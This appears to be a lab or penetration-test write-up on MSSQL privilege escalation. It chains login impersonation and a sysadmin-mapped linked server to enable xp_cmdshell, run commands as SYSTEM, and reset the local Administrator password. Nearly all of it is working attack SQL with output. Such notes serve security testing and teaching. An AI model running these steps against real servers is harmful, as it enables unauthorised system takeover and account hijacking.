## Privesc — Impersonation + Linked Server Abuse

### Key finding

- Querying `LOCAL.TEST.LINKED.SRV` as Fiona → `NT AUTHORITY\ANONYMOUS LOGON` (fails)
- Querying as impersonated john → succeeds with `testadmin` (sysadmin)
```sql
EXECUTE AS LOGIN = 'john';
EXECUTE ('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV];              -- testadmin
EXECUTE ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];  -- 1
```

### Enable xp_cmdshell via linked server
```sql
EXECUTE ('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
EXECUTE ('EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
```

### OS command execution
```sql
EXECUTE ('EXECUTE master..xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
-- nt authority\system
```

### Change Administrator password for RDP
```sql
EXECUTE ('EXECUTE master..xp_cmdshell ''net user Administrator NewPass123!''') AT [LOCAL.TEST.LINKED.SRV];
-- The command completed successfully.
```
